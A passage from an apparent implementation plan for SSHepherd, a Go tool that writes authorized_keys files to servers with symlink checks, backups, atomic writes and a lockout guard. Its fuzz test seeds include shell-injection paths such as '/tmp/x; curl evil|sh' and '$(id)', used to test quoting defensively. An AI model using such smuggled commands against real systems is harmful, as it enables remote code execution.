		if _, err := os.Stat(target + ".sshepherd.bak"); !errors.Is(err, os.ErrNotExist) {
			t.Error("absent target must not create a backup")
		}
	})
}
```

- [ ] **Step 6.2: Write the failing protocol tests (seamed FleetWriter)**

Append to `internal/sshwrite/sshwrite_test.go`:

```go
// scriptedExec fakes sshconn.Exec: it records each command and returns the
// scripted response for the call ordinal.
type scriptedExec struct {
	cmds      []string
	responses []execResp
}

type execResp struct {
	code   int
	stdout string
	stderr string
	err    error
}

func (s *scriptedExec) exec(_ *ssh.Client, cmd string, stdin io.Reader) (int, *sshconn.CappedBuffer, *sshconn.CappedBuffer, error) {
	i := len(s.cmds)
	s.cmds = append(s.cmds, cmd)
	if stdin != nil {
		// Drain like a real session would; content correctness is asserted
		// via the verify stage's scripted stdout.
		_, _ = io.Copy(io.Discard, stdin)
	}
	r := execResp{}
	if i < len(s.responses) {
		r = s.responses[i]
	}
	if r.err != nil {
		return 0, nil, nil, r.err
	}
	out := sshconn.NewCappedBuffer(sshconn.MaxRemoteOutput)
	_, _ = out.Write([]byte(r.stdout))
	errBuf := sshconn.NewCappedBuffer(sshconn.MaxRemoteOutput)
	_, _ = errBuf.Write([]byte(r.stderr))
	return r.code, out, errBuf, nil
}

// seamedWriter builds a FleetWriter whose network is fully scripted.
func seamedWriter(s *scriptedExec) *FleetWriter {
	return &FleetWriter{
		connect: func(context.Context, config.Server) (*sshconn.Conn, error) {
			return &sshconn.Conn{}, nil // Close is nil-safe by design
		},
		exec: s.exec,
	}
}

func TestApplyProtocolHappyPath(t *testing.T) {
	content := []byte("rendered\n")
	s := &scriptedExec{responses: []execResp{
		{code: 0},                          // pre-check + backup
		{code: 0},                          // write
		{code: 0, stdout: string(content)}, // verify read-back
	}}
	srv := config.Server{Name: "w1", Host: "h", Port: 22, User: "u"}
	if err := seamedWriter(s).Apply(context.Background(), srv, content); err != nil {
		t.Fatalf("Apply: %v", err)
	}
	if len(s.cmds) != 3 {
		t.Fatalf("ran %d commands, want 3 (pre-check, write, verify)", len(s.cmds))
	}
	if s.cmds[0] != precheckCmdFor("~/.ssh/authorized_keys") {
		t.Errorf("cmd[0] = %q, want the default-path pre-check", s.cmds[0])
	}
	if s.cmds[1] != writeCmdFor("~/.ssh/authorized_keys") {
		t.Errorf("cmd[1] = %q, want the default-path write", s.cmds[1])
	}
	if s.cmds[2] != sshconn.AuthorizedKeysCmdFor("~/.ssh/authorized_keys") {
		t.Errorf("cmd[2] = %q, want the existing read command as verify", s.cmds[2])
	}
}

func TestApplyHonorsAuthorizedKeysFileOverride(t *testing.T) {
	content := []byte("x\n")
	s := &scriptedExec{responses: []execResp{
		{code: 0}, {code: 0}, {code: 0, stdout: "x\n"},
	}}
	srv := config.Server{Name: "w1", Host: "h", Port: 22, User: "u", AuthorizedKeysFile: "/etc/keys/u"}
	if err := seamedWriter(s).Apply(context.Background(), srv, content); err != nil {
		t.Fatalf("Apply: %v", err)
	}
	for i, want := range []string{
		precheckCmdFor("/etc/keys/u"), writeCmdFor("/etc/keys/u"), sshconn.AuthorizedKeysCmdFor("/etc/keys/u"),
	} {
		if s.cmds[i] != want {
			t.Errorf("cmd[%d] = %q, want override path command %q", i, s.cmds[i], want)
		}
	}
}

func TestApplySymlinkSentinelRefuses(t *testing.T) {
	s := &scriptedExec{responses: []execResp{{code: 45}}}
	err := seamedWriter(s).Apply(context.Background(), config.Server{Name: "w"}, []byte("x\n"))
	var symErr *SymlinkError
	if !errors.As(err, &symErr) {
		t.Fatalf("err = %v, want *SymlinkError", err)
	}
	if symErr.Path != "~/.ssh/authorized_keys" {
		t.Errorf("SymlinkError.Path = %q, want the target path named", symErr.Path)
	}
	if len(s.cmds) != 1 {
		t.Fatalf("ran %d commands after refusal, want 1 (never write past a refused pre-check)", len(s.cmds))
	}
}

func TestApplyStageFailures(t *testing.T) {
	tests := []struct {
		name      string
		responses []execResp
		wantIn    string
		wantCmds  int
	}{
		{"pre-check nonzero", []execResp{{code: 1, stderr: "cp: denied"}}, "pre-check", 1},
		{"write nonzero", []execResp{{code: 0}, {code: 1, stderr: "mv: read-only"}}, "write", 2},
		{"verify transport error", []execResp{{code: 0}, {code: 0}, {err: errors.New("channel gone")}}, "verify", 3},
		{"verify absent after write", []execResp{{code: 0}, {code: 0}, {code: 44}}, "absent after write", 3},
		{"verify bytes differ", []execResp{{code: 0}, {code: 0}, {code: 0, stdout: "tampered\n"}}, "differ", 3},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			s := &scriptedExec{responses: tt.responses}
			err := seamedWriter(s).Apply(context.Background(), config.Server{Name: "w"}, []byte("rendered\n"))
			if err == nil || !strings.Contains(err.Error(), tt.wantIn) {
				t.Fatalf("err = %v, want it to mention %q", err, tt.wantIn)
			}
			if len(s.cmds) != tt.wantCmds {
				t.Errorf("ran %d commands, want %d (later stages must not run after a failure)", len(s.cmds), tt.wantCmds)
			}
		})
	}
}

func TestApplyErrorsAreSanitized(t *testing.T) {
	t.Run("connect error", func(t *testing.T) {
		s := &scriptedExec{}
		w := seamedWriter(s)
		w.connect = func(context.Context, config.Server) (*sshconn.Conn, error) {
			return nil, errors.New("boom\x1b[31m")
		}
		err := w.Apply(context.Background(), config.Server{Name: "w"}, []byte("x\n"))
		if err == nil || !strings.Contains(err.Error(), "boom") {
			t.Fatalf("err = %v, want the connect failure surfaced", err)
		}
		if strings.Contains(err.Error(), "\x1b") {
			t.Errorf("err %q leaks control bytes; must pass the sanitized-error path", err)
		}
	})
	t.Run("remote stderr embedded sanitized", func(t *testing.T) {
		s := &scriptedExec{responses: []execResp{{code: 1, stderr: "denied\x1b[31m\x07"}}}
		err := seamedWriter(s).Apply(context.Background(), config.Server{Name: "w"}, []byte("x\n"))
		if err == nil || !strings.Contains(err.Error(), "denied") {
			t.Fatalf("err = %v, want remote stderr embedded", err)
		}
		if strings.ContainsAny(err.Error(), "\x1b\x07") {
			t.Errorf("err %q must not contain control bytes", err)
		}
	})
}
```

Create `internal/sshwrite/fuzz_test.go`:

```go
package sshwrite

import (
	"bytes"
	"os/exec"
	"strings"
	"testing"
)

// FuzzWriteCmds asserts both builders always produce syntactically valid
// POSIX shell for any path: `sh -n` parses without executing anything. A
// parse failure would mean the path escaped its ShQuote token — the class of
// defect sshconn's FuzzShQuote hunts, re-checked here against the write
// scripts' richer quoting context (command substitution, subshell,
// redirection, || group). Execution-based coverage for fixed hostile paths
// lives in TestWriteCmdThroughRealSh — fuzz-executing scripts that
// mkdir/rm at arbitrary fuzz-chosen paths is not sandbox-safe.
func FuzzWriteCmds(f *testing.F) {
	seeds := []string{
		"~/.ssh/authorized_keys",
		"/etc/o'brien/keys",
		"/tmp/x; curl evil|sh",
		"~/my keys/auth",
		"/tmp/$(id)/`id`",
		`/tmp/a"b`,
		"'",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, path string) {
		if strings.ContainsRune(path, 0) {
			t.Skip("NUL cannot survive execve; config validation rejects control characters")
		}
		for name, cmd := range map[string]string{
			"precheck": precheckCmdFor(path),
			"write":    writeCmdFor(path),
		} {
			c := exec.CommandContext(t.Context(), "sh", "-n", "-c", cmd)
			var stderr bytes.Buffer
			c.Stderr = &stderr
			if err := c.Run(); err != nil {
				t.Fatalf("%s script for path %q does not parse: %v (stderr %q)\nscript: %s",
					name, path, err, stderr.String(), cmd)
			}
		}
	})
}
```

Create `internal/sshwrite/leak_test.go` per the convention block.

- [ ] **Step 6.3: Run tests to verify they fail**

Run: `go test ./internal/sshwrite/ -v`
Expected: FAIL to compile — `undefined: precheckCmdFor`, `undefined: writeCmdFor`, `undefined: FleetWriter`, `undefined: SymlinkError`.

- [ ] **Step 6.4: Implement `internal/sshwrite/sshwrite.go`**

```go
// Package sshwrite performs apply's remote write protocol: symlink pre-check
// + backup, atomic temp+rename write, and read-back verify — three sessions
// over one SSH connection per server. Command builders are pure and share
// sshconn.PathAssign's quoting discipline (the path enters each script
// exactly once, fully quoted); only the network glue needs the integration
// suite, and even the protocol sequencing is unit-tested through seams.
package sshwrite

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"log/slog"
	"strings"

	"golang.org/x/crypto/ssh"

	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/sshconn"
)

// symlinkExit is the sentinel exit status the pre-check emits for a
// symlinked target (sibling of sshconn.FileAbsentExit, 44): mv would replace
// the link with a regular file, silently diverging what SSHepherd reads from
// what sshd may read, and breaking config-management setups.
const symlinkExit = 45

// precheckCmdFor builds the remote pre-check: refuse a symlinked target
// (exit 45), then back up an existing file with cp -p — single generation,
// overwritten per apply; an absent file needs no backup.
func precheckCmdFor(path string) string {
	return sshconn.PathAssign(path) +
		`; if [ -L "$p" ]; then exit 45; fi; if [ -e "$p" ]; then cp -p "$p" "$p".sshepherd.bak; fi`
}

// writeCmdFor builds the atomic write (the exact script from the apply
// spec). umask 077 pins the temp file to 0600 before a byte is written;
// rm -f + set -C (noclobber) guarantee cat creates a fresh file — never
// truncating through a pre-existing file or symlink at the predictable temp
// name; mv in the same directory is an atomic rename, so sshd never
// observes a partial file; failure leaves the original untouched and
// removes the temp. mkdir -p covers first-contact servers (for the default
// path it creates ~/.ssh with 0700 thanks to the umask). Content arrives on
// stdin — key material is never shell-encoded.
func writeCmdFor(path string) string {
	return sshconn.PathAssign(path) +
		`; umask 077; d=$(dirname "$p"); mkdir -p "$d"; t="$p".sshepherd.tmp; rm -f "$t"; (set -C; cat > "$t") && mv "$t" "$p" || { rm -f "$t"; exit 1; }`
}

// SymlinkError reports a refused write: the target path is a symlink. The
// operator points authorized_keys_file at the real target if writing
// through was the intent.
type SymlinkError struct{ Path string }

func (e *SymlinkError) Error() string {
	return fmt.Sprintf("%s is a symlink — refusing to replace it with a regular file (point authorized_keys_file at the real target if intended)", e.Path)
}

// FleetWriter applies rendered authorized_keys content to servers over SSH.
// It is apply's Writer seam implementation.
type FleetWriter struct {
	Dialer *sshconn.Dialer
	Log    *slog.Logger // optional stage-level telemetry; nil discards

	// Test seams; nil selects the real implementations.
	connect func(ctx context.Context, srv config.Server) (*sshconn.Conn, error)
	exec    func(client *ssh.Client, cmd string, stdin io.Reader) (int, *sshconn.CappedBuffer, *sshconn.CappedBuffer, error)
}

// log returns the configured logger or a discard logger, so call sites never
// nil-check.
func (w *FleetWriter) log() *slog.Logger {
	if w.Log != nil {
		return w.Log
	}
	return slog.New(slog.DiscardHandler)
}

// Apply makes srv's authorized_keys equal content: pre-check + backup,
// atomic write (content on stdin), then read-back verify (byte-compare —
// trusting mv's exit status would leave silent-corruption blind spots for
// the cost of one extra cat). Any error means the server did not verifiably
// converge; a *SymlinkError specifically means the write was refused before
// any change. All errors pass the sanitized-error path: remote text never
// reaches a terminal raw.
func (w *FleetWriter) Apply(ctx context.Context, srv config.Server, content []byte) error {
	connect := w.connect
	if connect == nil {
		connect = w.Dialer.Connect
	}
	execCmd := w.exec
	if execCmd == nil {
		execCmd = sshconn.Exec
	}

	conn, err := connect(ctx, srv)
	if err != nil {
		return sshconn.SanitizedError{Err: err}
	}
	defer func() { _ = conn.Close() }() // errcheck: close error is uninteresting after the verify verdict

	path := srv.AuthorizedKeysFile
	if path == "" {
		path = sshconn.DefaultAuthorizedKeysPath
	}
	log := w.log()

	// Stage 1: symlink refusal + single-generation backup.
	code, _, stderr, err := execCmd(conn.Client, precheckCmdFor(path), nil)
	if err != nil {
		return sshconn.SanitizedError{Err: fmt.Errorf("pre-check on %s: %w", srv.Name, err)}
	}
	if code == symlinkExit {
		return &SymlinkError{Path: path}
	}
	if code != 0 {
		return stageFailure("pre-check", srv.Name, code, stderr)
	}
	log.Debug("pre-check ok", "server", srv.Name)

	// Stage 2: atomic write, rendered bytes on stdin.
	code, _, stderr, err = execCmd(conn.Client, writeCmdFor(path), bytes.NewReader(content))
	if err != nil {
		return sshconn.SanitizedError{Err: fmt.Errorf("write on %s: %w", srv.Name, err)}
	}
	if code != 0 {
		return stageFailure("write", srv.Name, code, stderr)
	}
	log.Debug("write ok", "server", srv.Name, "bytes", len(content))

	// Stage 3: verify — re-read through the existing read command and
	// byte-compare against the render.
	code, stdout, stderr, err := execCmd(conn.Client, sshconn.AuthorizedKeysCmdFor(path), nil)
	if err != nil {
		return sshconn.SanitizedError{Err: fmt.Errorf("verify on %s: %w", srv.Name, err)}
	}
	res, err := sshconn.FinishRead(code, stdout, stderr, srv.Name, log)
	if err != nil {
		return sshconn.SanitizedError{Err: fmt.Errorf("verify on %s: %w", srv.Name, err)}
	}
	if res.FileAbsent {
		return fmt.Errorf("verify on %s: file absent after write", srv.Name)
	}
	if !bytes.Equal(res.Content, content) {
		return fmt.Errorf("verify on %s: file bytes differ from the rendered desired state", srv.Name)
	}
	log.Debug("verify ok", "server", srv.Name)
	return nil
}

// stageFailure wraps a nonzero remote exit with its sanitized stderr.
func stageFailure(stage, server string, code int, stderr *sshconn.CappedBuffer) error {
	return fmt.Errorf("%s on %s failed (exit %d): %s",
		stage, server, code, strings.TrimSpace(sshconn.SanitizeRemote(stderr.String())))
}
```

- [ ] **Step 6.5: Run the package tests + short fuzz**

Run: `go test ./internal/sshwrite/ -v && go test -run='^$' -fuzz=FuzzWriteCmds -fuzztime=15s ./internal/sshwrite`
Expected: PASS; no fuzz crashers.

Add to the Makefile `fuzz` target (after the FuzzShQuote line):

```make
	$(GO) test -run='^$$' -fuzz=FuzzWriteCmds -fuzztime=15s ./internal/sshwrite
```

- [ ] **Step 6.6: Gate**

Run the gate (four commands). Expected: clean.

- [ ] **Step 6.7: Commit**

```bash
git add internal/sshwrite/ Makefile
git commit -m "$(cat <<'EOF'
feat(sshwrite): atomic remote write with symlink guard, backup, verify

Pure builders (spec's exact scripts: exit-45 symlink sentinel, cp -p
single-generation backup, umask 077 + noclobber temp + mv rename), executed
as three sessions over one connection with a byte-compare verify; protocol
fully unit-tested through connect/exec seams, sh -n fuzz on the builders.

Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 7: `feat(apply)` — plan computation, guard, and report (pure core)

Everything decision-shaped, with no I/O: per-server classification (`converged` / `change` with add/remove/rewrite/normalize rows / `refused` / `unreachable`), the self-lockout guard (intersection over agent-held keys, rotate note, restrictive-options warning, empty-agent fallback), phase-2 orchestration behind a `Writer` seam, and the two-part report (plan blocks at the confirmation gate; outcome lines + `Summary:` after phase 2 — the spec's example report is the concatenation of both parts).

**Files:**
- Create: `internal/apply/plan.go`, `internal/apply/report.go`, `internal/apply/exec.go`
- Test: `internal/apply/plan_test.go`, `internal/apply/report_test.go`, `internal/apply/exec_test.go`, `internal/apply/leak_test.go`
- Create (via `-update`): `internal/apply/testdata/plan_mixed.golden`, `plan_mixed_color.golden`, `summary_applied.golden`, `summary_pending.golden`

- [ ] **Step 7.1: Create `internal/apply/plan.go`**

```go
// Package apply computes the write plan for `sshepherd apply`: pure
// classification of each server against the manifest's rendered desired
// state, the self-lockout guard, phase-2 orchestration behind a writer
// seam, and the plan/outcome report. Nothing here touches the network.
package apply

import (
	"bytes"
	"fmt"
	"slices"
	"strings"

	"github.com/javadh75/SSHepherd/internal/audit"
	"github.com/javadh75/SSHepherd/internal/authkeys"
	"github.com/javadh75/SSHepherd/internal/config"
)

// Class classifies one server's plan.
type Class string

const (
	// ClassConverged: current bytes equal the render, or the desired set is
	// empty with nothing installed ("nothing should be there and nothing is").
	ClassConverged Class = "converged"
	// ClassChange: a write is needed and allowed.
	ClassChange Class = "change"
	// ClassRefused: a write would occur but must not (wipe, unparseable
	// content, predicted lockout).
	ClassRefused Class = "refused"
	// ClassUnreachable: the phase-1 read failed; nothing knowable.
	ClassUnreachable Class = "unreachable"
)

// Outcome is the phase-2 result for a ClassChange server.
type Outcome string

const (
	OutcomePending Outcome = "pending" // not written: dry-run, declined, or phase 2 not run
	OutcomeApplied Outcome = "applied" // written and byte-verified
	OutcomeRefused Outcome = "refused" // refused at the server (symlinked target)
	OutcomeFailed  Outcome = "failed"  // write or verify failed
)

// RewriteRow is a matched key whose on-server form differs from the render.
type RewriteRow struct {
	Key            authkeys.Key // desired (manifest) form
	ActualComment  string
	DesiredComment string
	CommentDiffers bool
	OptionsDiffer  bool
}

// Normalize captures byte drift the per-key rows don't explain.
type Normalize struct {
	Reorder     bool // matched keys ordered differently than desired
	NonKeyLines int  // current comment/blank lines (managed header excluded) the rewrite removes
	Whitespace  bool // residual byte drift with nothing else to blame
}

// Any reports whether a normalize row should render.
func (n Normalize) Any() bool { return n.Reorder || n.NonKeyLines > 0 || n.Whitespace }

// ServerPlan is the computed plan for one server.
type ServerPlan struct {
	Server  config.Server
	Class   Class
	Err     error  // unreachable detail
	Refusal string // refused detail

	Desired  []authkeys.Key // rendered key set, DesiredFor order
	Rendered []byte         // the exact bytes a write installs

	Add       []authkeys.Key // desired but missing
	Remove    []authkeys.Key // installed but not desired (on-server form)
	Rewrites  []RewriteRow
	Normalize Normalize

	Note       string // guard note: session key removed, another survives
	Warning    string // restrictive-options warning
	FileAbsent bool   // phase-1 diagnostic, carried into the report

	Outcome    Outcome
	OutcomeErr error
}

// Build computes the plan for every phase-1 result. agentFPs is the set of
// SHA256 fingerprints the operator's agent held at preflight — the
// self-lockout guard's ground truth. Pure; the only possible error is a
// render failure, impossible for a validated manifest (a tool bug, exit 3).
func Build(cfg *config.Config, results []audit.ServerResult, agentFPs []string) ([]ServerPlan, error) {
	plans := make([]ServerPlan, 0, len(results))
	for _, r := range results {
		p, err := planOne(cfg, r, agentFPs)
		if err != nil {
			return nil, err
		}
		plans = append(plans, p)
	}
	return plans, nil
}

func planOne(cfg *config.Config, r audit.ServerResult, agentFPs []string) (ServerPlan, error) {
	p := ServerPlan{Server: r.Server, Outcome: OutcomePending, FileAbsent: r.FileAbsent}
	if r.Err != nil {
		p.Class = ClassUnreachable
		p.Err = r.Err
		return p, nil
	}

	entries := desiredEntries(cfg, r.Server.Name)
	for _, e := range entries {
		p.Desired = append(p.Desired, e.Key)
	}

	// Empty desired set: apply never wipes a server, so nothing is ever
	// written here — converged when nothing (parseable or not) is
	// installed, refused otherwise.
	if len(entries) == 0 {
		if len(r.Diff.Unauthorized) == 0 && len(r.ParseErrs) == 0 {
			p.Class = ClassConverged
			return p, nil
		}
		p.Class = ClassRefused
		p.Refusal = fmt.Sprintf("%d keys installed but manifest grants none — refusing to wipe",
			len(r.Diff.Unauthorized))
		if n := len(r.ParseErrs); n > 0 {
			p.Refusal = fmt.Sprintf(
				"%d keys and %d unparseable lines installed but manifest grants none — refusing to wipe",
				len(r.Diff.Unauthorized), n)
		}
		return p, nil
	}

	// Unparseable lines: a full-file render would destroy content we could
	// not account for. Remediation: fix the line remotely or correct
	// authorized_keys_file.
	if n := len(r.ParseErrs); n > 0 {
		p.Class = ClassRefused
		p.Refusal = fmt.Sprintf(
			"%d unparseable line(s) — refusing to rewrite a file that could not be fully read (fix the line(s) or correct authorized_keys_file)", n)
		return p, nil
	}

	rendered, err := authkeys.Render(entries)
	if err != nil {
		return p, fmt.Errorf("render %s: %w", r.Server.Name, err)
	}
	p.Rendered = rendered

	// Byte-exact convergence: a server needs a write iff its current bytes
	// differ from the render. (A file-absent server with desired keys is
	// never converged — the file itself is missing.)
	if !r.FileAbsent && bytes.Equal(r.Content, rendered) {
		p.Class = ClassConverged
		return p, nil
	}

	p.Add = r.Diff.Missing
	p.Remove = r.Diff.Unauthorized
	p.Rewrites = rewriteRows(r, entries)
	explained := len(p.Add)+len(p.Remove)+len(p.Rewrites) > 0
	p.Normalize = normalize(r, entries, explained)

	v := guardCheck(cfg, r, entries, agentFPs)
	if v.Refusal != "" {
		p.Class = ClassRefused
		p.Refusal = v.Refusal
		return p, nil
	}
	p.Note, p.Warning = v.Note, v.Warning
	p.Class = ClassChange
	return p, nil
}

// desiredEntries builds the render input for one server: DesiredFor order
// (operators first), comments resolved through config.DesiredComment — the
// single write-time comment policy, shared with audit --comments so the
// preview and the write can never disagree.
func desiredEntries(cfg *config.Config, serverName string) []authkeys.RenderEntry {
	keys := cfg.DesiredFor(serverName)
	entries := make([]authkeys.RenderEntry, 0, len(keys))
	for _, k := range keys {
		u, _ := cfg.OwnerOf(k.Fingerprint) // always found: DesiredFor emits only owned keys
		entries = append(entries, authkeys.RenderEntry{Key: k, Comment: config.DesiredComment(u, k)})
	}
	return entries
}

// rewriteRows finds matched keys whose on-server form differs from what the
// render writes: comment (per the decided policy) or options.
func rewriteRows(r audit.ServerResult, entries []authkeys.RenderEntry) []RewriteRow {
	var rows []RewriteRow
	for _, e := range entries {
		actual, ok := r.Diff.Actual[e.Key.Fingerprint]
		if !ok {
			continue
		}
		row := RewriteRow{
			Key:            e.Key,
			ActualComment:  actual.Comment,
			DesiredComment: e.Comment,
			CommentDiffers: actual.Comment != e.Comment,
			OptionsDiffer:  !slices.Equal(actual.Options, e.Key.Options),
		}
		if row.CommentDiffers || row.OptionsDiffer {
			rows = append(rows, row)
		}
	}
	return rows
}

// normalize explains byte drift beyond the per-key rows: non-key lines the
// full-file render removes, reordering of matched keys, or (when nothing
// else accounts for the byte difference) residual whitespace/format drift.
// Only called for servers whose bytes differ from the render.
func normalize(r audit.ServerResult, entries []authkeys.RenderEntry, explained bool) Normalize {
	var n Normalize
	lines := strings.Split(string(r.Content), "\n")
	if len(lines) > 0 && lines[len(lines)-1] == "" {
		lines = lines[:len(lines)-1] // a well-formed file's trailing newline, not a blank line
	}
	for _, line := range lines {
		t := strings.TrimSpace(strings.TrimSuffix(line, "\r"))
		if t == authkeys.ManagedHeader {
			continue // re-emitted by the render, not removed
		}
		if t == "" || strings.HasPrefix(t, "#") {
			n.NonKeyLines++
		}
	}

	// Reorder: the matched keys' relative order on the server vs. desired.
	// Content re-parses cleanly here (parse errors were refused earlier);
	// duplicate fingerprints collapse first-wins, exactly like Diff.
	desiredSet := make(map[string]bool, len(entries))
	var want []string
	for _, e := range entries {
		desiredSet[e.Key.Fingerprint] = true
	}
	for _, e := range entries {
		if _, ok := r.Diff.Actual[e.Key.Fingerprint]; ok {
			want = append(want, e.Key.Fingerprint)
		}
	}
	actualKeys, _ := authkeys.ParseFile(r.Content)
	seen := make(map[string]bool, len(actualKeys))
	var got []string
	for _, k := range actualKeys {
		if seen[k.Fingerprint] {
			continue
		}
		seen[k.Fingerprint] = true
		if desiredSet[k.Fingerprint] {
			got = append(got, k.Fingerprint)
		}
	}
	n.Reorder = !slices.Equal(want, got)

	if !explained && !n.Reorder && n.NonKeyLines == 0 {
		n.Whitespace = true
	}
	return n
}

// guardVerdict is the self-lockout guard's decision for one server.
type guardVerdict struct {
	Refusal string
	Note    string
	Warning string
}

// guardCheck enforces the invariant "after the write, this operator can
// still log in": the rendered desired set must intersect the agent-held
// keys. Deliberately not the operator spec's literal "never remove the
// session key" — which key signs a handshake is an accident of agent order
// and server choice, and the literal rule would randomly block rotate (see
// the 2026-07-19 spec's guard section; owner-approved refinement). Removing
// the very key that authenticated is allowed when another agent-held key
// survives — that is what rotate is — with a loud per-server note.
func guardCheck(cfg *config.Config, r audit.ServerResult, entries []authkeys.RenderEntry, agentFPs []string) guardVerdict {
	held := make(map[string]bool, len(agentFPs))
	for _, fp := range agentFPs {
		held[fp] = true
	}
	// Defensive fallback: no usable agent listing (agent died mid-run) —
	// purely additive writes may proceed, anything that removes a key is
	// refused.
	if len(held) == 0 {
		if len(r.Diff.Unauthorized) > 0 {
			return guardVerdict{Refusal: "agent key listing is unavailable — refusing a write that removes keys"}
		}
		return guardVerdict{}
	}

	var surviving []authkeys.Key
	restrictive := 0
	for _, e := range entries {
		if !held[e.Key.Fingerprint] {
			continue
		}
		surviving = append(surviving, e.Key)
		if hasRestrictiveOption(e.Key.Options) {
			restrictive++
		}
	}
	if len(surviving) == 0 {
		return guardVerdict{Refusal: fmt.Sprintf(
			"none of the %d keys in this agent would remain in %s's authorized_keys — applying would lock this session out. Add one of your keys to the manifest (or mark its user operator: true)",
			len(agentFPs), r.Server.Name)}
	}

	var v guardVerdict
	if fp := r.SessionKeyFP; fp != "" && !fpInEntries(entries, fp) {
		if _, installed := r.Diff.Actual[fp]; installed {
			v.Note = fmt.Sprintf("removes the key this session logged in with; %s remains",
				survivorLabel(cfg, surviving[0]))
		}
	}
	if restrictive == len(surviving) {
		v.Warning = "every remaining agent-held key carries a restrictive option (from=/command=/restrict/expiry-time=) — future sshepherd logins may be functionally blocked"
	}
	return v
}

func fpInEntries(entries []authkeys.RenderEntry, fp string) bool {
	for _, e := range entries {
		if e.Key.Fingerprint == fp {
			return true
		}
	}
	return false
}

// survivorLabel names the agent-held key that keeps this session's access:
// the owning user, or the fingerprint for a key the manifest cannot name
// (unreachable in practice — surviving keys are desired, hence owned).
func survivorLabel(cfg *config.Config, k authkeys.Key) string {
	if u, ok := cfg.OwnerOf(k.Fingerprint); ok {
		return u.Name
	}
	return k.Fingerprint
}

// restrictive authorized_keys options can limit whether a future
// non-interactive SSHepherd login works at all: from= (source filter),
// command= (no shell), restrict (everything off), expiry-time=.
func hasRestrictiveOption(options []string) bool {
	for _, o := range options {
		lo := strings.ToLower(o)
		if lo == "restrict" || strings.HasPrefix(lo, "from=") ||
			strings.HasPrefix(lo, "command=") || strings.HasPrefix(lo, "expiry-time=") {
			return true
		}
	}
	return false
}

// ExitCode maps plans to the process exit code (monitoring-style, mirroring
// audit): 0 when every targeted server is converged — already, or applied
// and verified this run; 1 otherwise (pending under --dry-run or a declined
// prompt, refused, failed, unreachable). Tool errors (3) are the caller's
// domain; 2 stays reserved (audit's critical drift; apply has no
// equivalent class yet).
func ExitCode(plans []ServerPlan) int {
	for _, p := range plans {
		if p.Class == ClassConverged || (p.Class == ClassChange && p.Outcome == OutcomeApplied) {
			continue
		}
		return 1
	}
	return 0
}
```

- [ ] **Step 7.2: Create `internal/apply/exec.go`**

```go
package apply

import (
	"context"
	"errors"
	"fmt"
	"log/slog"
	"sync"
	"time"

	"github.com/javadh75/SSHepherd/internal/config"
	"github.com/javadh75/SSHepherd/internal/sshwrite"
)

// Writer is the phase-2 seam; sshwrite.FleetWriter is the real one.
type Writer interface {
	Apply(ctx context.Context, srv config.Server, content []byte) error
}

// ExecOptions tunes the phase-2 fan-out; mirrors audit.Options.
type ExecOptions struct {
	Parallel         int           // max concurrent server writes (>= 1)
	PerServerTimeout time.Duration // overall deadline per server; 0 = none
	AgentFPs         []string      // guard re-check ground truth — the same list Build saw
	Logger           *slog.Logger  // optional per-server telemetry; nil discards
}

func (o ExecOptions) logger() *slog.Logger {
	if o.Logger != nil {
		return o.Logger
	}
	return slog.New(slog.DiscardHandler)
}

// Execute writes every ClassChange plan through w with a bounded pool,
// mutating each plan's Outcome in place; other classes are untouched.
// Servers proceed independently — no global abort: partial application is
// visible in the report and re-running apply is always safe because the
// render is idempotent.
func Execute(ctx context.Context, plans []ServerPlan, w Writer, opts ExecOptions) {
	if opts.Parallel < 1 {
		opts.Parallel = 1
	}
	log := opts.logger()
	held := make(map[string]bool, len(opts.AgentFPs))
	for _, fp := range opts.AgentFPs {
		held[fp] = true
	}
	sem := make(chan struct{}, opts.Parallel)
	var wg sync.WaitGroup
	for i := range plans {
		if plans[i].Class != ClassChange {
			continue
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			applyOne(ctx, &plans[i], w, held, opts.PerServerTimeout, log)
		}()
	}
	wg.Wait()
}

// applyOne writes one server. The guard re-check is authoritative and
// defensive: Build already refused guard failures, but no code path may
// reach a write without the invariant holding right now.
func applyOne(ctx context.Context, p *ServerPlan, w Writer, held map[string]bool, timeout time.Duration, log *slog.Logger) {
	if !guardHolds(p, held) {
		p.Outcome = OutcomeFailed
		p.OutcomeErr = errors.New("guard re-check failed — refusing to write (agent changed mid-run, or a bug)")
		log.Warn(fmt.Sprintf("%s: %v", p.Server.Name, p.OutcomeErr))
		return
	}
	if timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, timeout)
		defer cancel()
	}
	start := time.Now()
	if err := w.Apply(ctx, p.Server, p.Rendered); err != nil {
		var symErr *sshwrite.SymlinkError
		if errors.As(err, &symErr) {
			p.Outcome = OutcomeRefused
		} else {
			p.Outcome = OutcomeFailed
		}
		p.OutcomeErr = err
		log.Warn(fmt.Sprintf("%s: %v", p.Server.Name, err))
		return
	}
	p.Outcome = OutcomeApplied
	log.Debug("applied", "server", p.Server.Name, "dur", time.Since(start).Round(time.Millisecond))
}

// guardHolds re-asserts the lockout invariant against the preflight agent
// list: some desired key is agent-held — or, under the empty-listing
// fallback, the write removes nothing.
func guardHolds(p *ServerPlan, held map[string]bool) bool {
	if len(held) == 0 {
		return len(p.Remove) == 0
	}
	for _, k := range p.Desired {
		if held[k.Fingerprint] {
			return true
		}
	}
	return false
}
```

- [ ] **Step 7.3: Create `internal/apply/report.go`**

```go
package apply

import (
	"fmt"
	"io"
	"strings"
	"text/tabwriter"

	"github.com/javadh75/SSHepherd/internal/authkeys"
	"github.com/javadh75/SSHepherd/internal/config"
)

// RenderOptions tunes report presentation.
type RenderOptions struct {
	Color bool // ANSI-color glyphs and key words; off = byte-identical to plain
}

// SGR codes, four characters each — the same tabwriter-safe discipline as
// audit's report (columns stay aligned whether or not color is on).
const (
	codeGreen   = "0;32"
	codeRed     = "0;31"
	codeBoldRed = "1;31"
	codeYellow  = "0;33"
)

// palette paints report fragments when color is on.
type palette struct{ on bool }

func (p palette) paint(code, s string) string {
	if !p.on {
		return s
	}
	return "\x1b[" + code + "m" + s + "\x1b[0m"
}

// oneLine collapses newlines so hostile error text cannot forge report rows
// or a Summary line (terminal escapes are already stripped upstream).
func oneLine(err error) string {
